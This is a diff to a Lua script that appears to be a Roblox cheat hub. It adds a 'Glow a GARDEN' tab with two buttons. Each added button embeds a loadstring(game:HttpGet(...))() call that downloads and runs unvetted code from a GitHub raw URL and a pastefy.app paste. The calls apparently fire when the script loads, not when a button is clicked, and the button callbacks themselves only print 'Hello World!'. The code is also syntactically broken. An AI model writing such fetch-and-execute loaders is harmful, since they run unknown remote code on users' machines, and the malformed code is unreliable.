@@ -136,3 +136,16 @@ Toggle1:Callback(function(Value)
         end
     end
 end)
+
+local Tab1 = Window:MakeTab({"Glow a GARDEN🌻", "flower"}) 
+
+Tab1:AddButton({"m00mdiety",
+loadstring(game:HttpGet('https://raw.githubusercontent.com/m00ndiety/Moondiety/refs/heads/main/Loader'))() function(Value)
+print("Hello World!")
+end})
+
+Tab1:AddButton({"dark spawner",
+loadstring(game:HttpGet("https://pastefy.app/SC4qoDAW/raw"))()
+function(Value)
+print("Hello World!")
+end})
